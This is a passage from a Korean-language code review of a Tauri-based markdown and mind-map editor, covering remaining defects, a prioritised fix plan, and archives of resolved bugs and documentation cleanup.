## P2-5. `generateId`의 `Math.random` 의존 *(미해결)*

**[파일 & 라인]** `block/store.ts:25`
**[조치 방안]** `crypto.randomUUID()` 사용. 여기서의 충돌은 React key와 포커스 타깃을 동시에 망가뜨리며 **P1-4와 증상이 구분되지 않습니다.**

## P2-6. 닫히지 않은 코드 펜스가 문서 전체를 한 블록으로 붕괴시킴

**[파일 & 라인]** `block/store.ts:117-140` · `parser.ts:31-36`
**[근본 원인]** `insideCodeFence` 불리언이 펜스 문자 종류·길이를 대조하지 않고 토글되며 EOF에서 리셋되지 않습니다. 사용자가 여는 펜스를 입력하는 **순간** 그 아래 모든 헤딩이 경계 자격을 잃어 문서 후반이 하나의 CodeMirror 블록으로 합쳐지고 마인드맵 노드가 사라집니다.
**[조치 방안]** `CodeBlockDecorator`처럼 여는 펜스의 문자/길이를 기억해 대응하는 닫는 펜스만 인정하고, 미종료 펜스는 슬라이싱 관점에서 "펜스 없음"으로 취급해 실시간 입력이 문서 구조를 흔들지 않게 합니다.

## P2-7. Rust 기동 경로의 panic 위험

**[파일 & 라인]** `project/src-tauri/src/lib.rs` — `close_splashscreen` 내 `splashscreen.close().unwrap()` / `main_window.show().unwrap()`
**[근본 원인]** reveal 시퀀스 실패 시 `Err` 반환이 아니라 커맨드 내부 panic이 발생합니다. `App.tsx`에 이미 JS 폴백이 있음에도 도달하지 못합니다. *(v0.8.4의 lib.rs 정리에서도 이 두 `unwrap`은 그대로 남았습니다.)*
**[조치 방안]** `close_splashscreen`을 `Result<(), String>`으로 바꾸고 두 호출 모두 `map_err`로 승격합니다.

## P2-8. `ImageDecorator`의 사문화된 커서 스킵 코드

**[파일 & 라인]** `ImageDecorator.ts:80`
**[근본 원인]** 내부 정규식 루프의 `pos = line.to + 1`은 라인 92에서 즉시 덮어써집니다. 동작은 정상이나 외부 루프를 전진시키는 것처럼 읽혀 유지보수자를 오도합니다.
**[조치 방안]** 라인 80을 삭제하고 `continue;`만 남깁니다.

---

## 📊 조치 우선순위 요약 (v0.8.5 기준 재정렬)

| 순위 | 항목 | 유형 | 영향도 | 난이도 |
|---|---|---|---|---|
| 1 | **P0-1** 마크다운 XSS → 임의 파일 접근 *(dot 파일 개방으로 상승)* | 🔒 보안 | 치명 | 중간 |
| 2 | **P0-5** dirty 탭 무경고 파괴 | 🔴 데이터 로스 | 높음 | 쉬움 |
| 3 | **P0-3** 분할 패널 표시 불일치 (Stage A-2 잔여) | 🟠 UX/구조 | 중간 | 중간 |
| 4 | P1-4 비헤딩 블록 키 충돌 (커서 유실) | 🟡 버그 | 중간 | 중간 |
| 5 | P1-7 병합 regex / 포커스 복원 | 🟡 버그 | 중간 | 쉬움 |
| 6 | P1-2 dirty 기준선 부재 | 🟡 버그 | 중간 | 중간 |
| 7 | P1-1 경로 접두사 매칭 오염 | 🟡 버그 | 중간 | 쉬움 |
| 8 | P1-3 워크스페이스 전환 시 blockStore 잔존 | 🟡 메모리 | 중간 | 쉬움 |
| 9 | P1-6 전역 활성 뷰 null 처리 | 🟡 버그 | 중간 | 쉬움 |
| 10 | P1-5 입력당 이중 `onUpdate` | 🟡 성능 | 중간 | 쉬움 |
| 11 | P2-1 · P2-2 · P2-3 렌더링 최적화 | 🟢 성능 | 중간 | 중간 |
| 12 | P0-3 Stage B 탭 스코프 스토어 | 🟠 구조 | 높음 | 높음 |
| 13 | P2-4 ~ P2-8 코드 품질 | 🟢 품질 | 낮음 | 쉬움 |

### 권장 진행 순서

1. **런타임 검증부터 (0.5일)** — v0.8.5의 asset 프로토콜 수정은 아직 **정적 검증만** 되어 있습니다. `pnpm tauri dev` 후 DEBUG_PLAN §5.2의 V1~V8을 실행해 이 항목을 확정 종료하십시오. 이것이 열려 있는 한 P1-8(이미지 렌더링)의 회귀 여부도 미확정입니다.
2. **이번 스프린트 (데이터 안전성 마무리)** — **P0-5**. P0-2·P0-4·P0-6이 해소되어 "편집이 살아남는다"는 신뢰가 생긴 만큼, 닫기 경로의 소실이 유일하게 남은 데이터 로스입니다. 국소 수정이며 P1-2(dirty 기준선)와 묶으면 가드 정확도까지 함께 올라갑니다.
3. **외부 파일 공유/배포 이전 필수** — **P0-1**. 유일하게 앱 경계를 넘어 파급되는 결함이며, `deny: []` + `requireLiteralLeadingDot: false` 조합으로 노출 자산이 늘어난 상태입니다. **최소한 `deny` 목록만이라도 즉시 반영**하고(설정 1줄, 재빌드 필요), L1~L3은 별도 커밋으로 진행하십시오.
4. **커서 유실 계열 일괄 처리** — **P1-4 → P1-7 → P2-5**. 세 항목이 동일 증상(리마운트로 인한 포커스·IME 조합 유실)으로 수렴하므로 개별 대응하면 원인 판별이 어렵습니다. 한 묶음으로 처리 후 `ticket/debug/`의 커서 점프 이슈를 재현 테스트하십시오.
5. **메모리 최적화 스프린트와 병행** — P1-3, P2-1, P2-2, P2-3. P1-8이 해소되어 **최대 단일 할당원은 이미 제거**되었으므로, 다음 병목은 리렌더 범위입니다.
6. **v1.0.0 탭 스코프 리팩터링에 통합** — P0-3 Stage B. `advanced_rendering_optimization` Phase 1(상태 스냅샷)과 **동일 지점**이므로 반드시 함께 처리합니다.

> **게이트 규칙 (`implementation_plan` 정합성)**: Sprint 3(렌더링/메모리 최적화) 착수 전 **P0-5 완료**를 게이트로 둡니다. Sprint 3의 TTL 언마운트(`advanced_rendering_optimization` §3.1)는 "탭이 사용자 모르게 파괴되는" 동작이므로, 닫기 경로의 dirty 가드가 없는 상태로 도입하면 **소실 지점이 전 탭으로 확대**됩니다.

---

## 👍 잘 유지되고 있는 부분

- **소유권 태그(`ownerTabId`) 설계** *(신규)*: 전역 싱글톤을 유지하면서도 "이 스토어가 어느 탭의 것인가"를 판별 가능하게 만든 최소 침습적 해법입니다. P0-2·P0-4·P0-6·`saveFile` 원자성이 모두 이 한 필드 위에 서 있고, 향후 탭 스코프 스토어로 이행할 때 그대로 소멸시킬 수 있는 **일회용 스캐폴딩**이라는 점이 좋습니다.
- **`useDebouncedCallback` 표준화** *(신규)*: `flush()` / `cancel()` / `isPending()`을 노출해 언마운트 시점의 처리 정책을 **호출부가 결정**하도록 남겨둔 설계가 적절합니다. 훅이 자동 flush했다면 P0-4의 오염 방향만 뒤집혔을 것입니다.
- **`openSeq` 경합 토큰** *(신규)*: 비동기 `readFile` 응답의 스테일 판정을 최소 비용으로 해결했습니다.
- **Decorator Orchestrator 패턴**: 신규 문법 추가 시 파일 1개 추가로 끝나는 확장성 유지.
- **IME 3중 방어선**: `useImeInputManager` + `ImeIsolation` 확장 + `view.composing` 가드가 키맵 단위까지 일관 적용.
- **코드 펜스 격리**: 파서·블록 슬라이서·헤딩 카운터 세 곳 모두 펜스를 인식(미종료 펜스 처리만 P2-6로 남음).
- **`headingId.ts` 단일화**: 파서와 블록 스토어가 동일한 키 생성 함수를 공유.
- **`FileSystemRepository` 인터페이스**: Mock/Tauri 이중 구현으로 테스트 친화성 유지.
- **패널 GC 및 병합 로직**: `REF-20260810-01` 주석과 함께 최소 1개 패널 보장·인접 패널 병합이 방어적으로 구현.
- **ERD 엔티티 런타임 검증**: `erd.ts`의 `isRecord` / `normalizeTable` / `normalizeRelation`이 외부 JSON 입력을 방어적으로 정규화.
- **디버깅 문서화 관행** *(신규)*: `DEBUG_PLAN`이 런타임 로그 → Tauri 소스 라인 → glob 옵션까지 추적해 근본 원인을 확정하고, 이전 수정(`6c6fab0`)이 실패한 이유까지 정량적으로 증명한 점은 모범적입니다. 다만 **커밋 메시지의 해결 표기가 실제 변경 범위를 앞서간 사례(P0-5)** 가 있어, 커밋과 계획서 항목 간 대조를 머지 전 체크리스트로 고정할 것을 권장합니다.

---

# 📎 부록 A. 해결 완료 항목 아카이브

## A-1. v0.8.4 ~ v0.8.5 해결분 (DEBUG_PLAN 실행)

| 항목 | 원래 결함 | 현재 구현 | 확인 위치 |
|---|---|---|---|
| **P0-2** `openTab` 편집 소실 | `openTab`이 캐시 백업 없이 `readFile`로 덮어써 떠나는 탭의 미저장 버퍼가 영구 소실 | `_snapshotActiveTab()` 선행 호출로 버퍼 보존, 기존 탭은 `cache` 우선 복원(디스크 I/O 0), `openSeq` 토큰으로 스테일 응답 폐기 | `document/model/store.ts:74, 123-160` |
| **P0-4** 디바운스 교차 오염 | 150ms 타이머가 다음 입력 시에만 해제되어 탭 전환 직후 **새 문서 컨텍스트**에서 발화 | `useDebouncedCallback` + `ownerTabId` 가드 + 언마운트 `flush()`, 대상 탭을 명시하는 `updateContentForTab`으로 기록 | `BlockEditor.tsx:386-399` · `shared/lib/useDebouncedCallback.ts` |
| **P0-6** 드래그 재정렬 손상 | 평면 인덱스 1개만 splice해 헤딩만 이동, 자식 블록 고아화 + `await saveFile()`로 즉시 디스크 확정 | 노드+서브트리 통째 이동, 4단 경계 검사(자기 자손 드롭 금지·방향 보정 포함), **자동 저장 제거**하고 dirty 표시만 | `block/model/store.ts:234-255` · `ReadView.tsx:295-313` |
| **P0-3 Stage A-1/A-3** 저장 원자성 | 저장 경로는 활성 탭, 내용은 전역 병합본 → A 파일에 B 본문 기록 | `saveFile(paneId?, tabId?)`가 대상 탭을 명시 해석, `ownerTabId` 불일치 시 해당 탭 `cache.rawContent` 기록 | `document/model/store.ts:603-660` |
| **P1-8** base64 이미지 인라인 | 이미지마다 IPC 왕복 + 원본 1.37배 Data URL이 DOM에 상주 | `convertFileSrc` 직접 전환, Rust `read_image_base64` 커맨드 **삭제** | `ReadView.tsx:3, 92` · `src-tauri/src/lib.rs` |
| **asset:// 403** | `require_literal_leading_dot` unix 기본값 `true`로 `**`가 `.devoras/`를 매칭하지 못함 | `assetProtocol.scope`를 객체 형태로 전환하고 `requireLiteralLeadingDot: false` 지정, 중복 패턴 3건 제거 | `src-tauri/tauri.conf.json:39-49` |
| **P0-7** Read 모드 전환 시 blur *(신규 발견)* | CodeMirror 포커스 유지 상태로 Read 모드 전환 시 입력 블로킹 | `useLayoutEffect`로 `viewMode === 'read'` 시 `contentDOM.blur()` | `BlockEditor.tsx:359-365` |

> **미확정**: asset:// 403 항목은 **정적 검증(설정 역직렬화·glob 매칭 재현·`cargo check`)까지만** 완료되었습니다. DEBUG_PLAN §5.2의 V1~V8 육안 검증 전까지는 "해결"이 아니라 "해결 유력"으로 취급하십시오.

## A-2. 2026-08-15 → 2026-08-26 해결분

| 항목 | 원래 결함 | 현재 구현 | 확인 위치 |
|---|---|---|---|
| 코드 블록 격리 | 정규식을 전체 라인에 매핑해 펜스 내부 `# 주석`을 헤딩으로 오인 | `insideCodeFence` 토글로 펜스 구간 스킵 | `document/lib/parser.ts:29-36` |
| 블록 분할 방식 | `split('\n\n')`으로 표·코드블록이 조각남 | 라인 스캐너가 H1~H3 경계에서만 분할, 펜스 내부는 무시 | `block/model/store.ts:117-140` |
| `applyFormat` 중첩 블록 | `blocks.find()`로 루트만 탐색해 H2/H3 포맷이 무음 실패 | `flattenTree(...).find()`로 전체 트리 탐색 | `ReadView.tsx` |
| ERD 탭 이름변경/삭제 | `type === 'markdown'`만 처리 | `markdown \| erd` 모두 처리 (접두사 매칭은 **P1-1**) | `document/model/store.ts:416, 450` |
| `splitPane` direction | 파라미터를 무시하고 항상 우측 추가 | `layoutDirection` 상태로 `flex-col/flex-row` 분기 | `document/model/store.ts` · `WorkspacePage.tsx` |
| 동일 라인 다중 이미지 | 커서가 첫 이미지에 닿으면 이후 이미지 스킵 | `ranges` 수집 후 정렬·중첩 제거 방식으로 재작성 | `editor/decorators/impl/ImageDecorator.ts` |
| `Cmd+C` 전역 충돌 | `window` 리스너라 에디터 텍스트 복사와 충돌 | `containerRef` 스코프 + `tabIndex={-1}` + 선택 시 포커스 | `FileExplorer.tsx` |
| 파서의 레이아웃 계산 | 순수 파서가 x/y 좌표를 계산 (관심사 위반) | 파서는 구조만 반환, 좌표는 `MindView.displayNodes`에서 계산 | `MindView.tsx` |

---

# 📎 부록 B. 문서 정리 현황

| 파일명 | 상태 | 조치 |
|---|---|---|
| `code_review.md` (루트) | ✅ 본 문서 — v0.8.5 기준 최신 | 유지 (단일 소스) |
| `project/CODE_REVIEW.md` | 전 내용이 본 문서에 반영됨 | 삭제 가능. **미추적(untracked) 파일이므로 삭제 시 복구 불가** — 확인 후 진행 |
| `advanced_rendering_optimization.md` (루트) | ✅ 통합 완료 | 유지. **§5의 P1-8 행을 "해결됨"으로 갱신 필요** |
| `project/DEBUG_PLAN.md` | asset:// 403 계획서, 실행 완료(런타임 검증 잔여) | 런타임 V1~V8 확인 후 `claude-history/debug/`로 아카이브 |
| `claude-history/debug/DEBUG_PLAN_20260826_170853.md` | P0 계획서, 아카이브됨 | 유지 — **P0-1·P0-5 미실행분의 원본 설계이므로 재착수 시 참조** |
| `reference_project/…/settings.ts` ↔ `project/src/entities/erd/model/settings.ts` | ⚠️ 차이 129줄 — 이식본이 원본의 1/7 수준 | 🔎 **확인 필요** — 의도적 축소인지 이식 누락인지 판단 후 티켓화 |
| `.serena/project.yml` (루트 / `project/`) | 도구 설정 중복, 이름만 상이 | 🔎 Serena 활성 프로젝트를 하나로 정리 권장 |

### 연쇄 갱신이 필요한 문서

본 갱신에 따라 아래 문서들의 기술이 사실과 어긋납니다.

- **`function_roadmap.md`** — "현재 버전: 0.8.2" → `0.8.5`. Phase 5의 "`BlockEditor` 입력 시 O(N) 병목 최적화"는 P1-5로 잔존, "`ReadView` 중첩 블록 포맷팅 버그"는 이미 해결됨.
- **`advanced_rendering_optimization.md` §5** — P1-8·P0-4 행이 "이미 발생 중인 결함"으로 서술되어 있으나 **둘 다 해소**되었습니다. P1-3·P2-1·P2-3만 유효합니다.
- **`architecture_stages.md` Stage 1** — `[x] documentStore를 탭별 로컬 캐시 구조로 리팩터링` 항목은 **캐시 계층까지만 완료**이며 탭 스코프 스토어(P0-3 Stage B)는 미착수입니다. `[~]` 등으로 구분 표기를 권장합니다.

> 참고: 통합 전 원본은 `git show HEAD:code_review.md`로 언제든 복원할 수 있습니다.
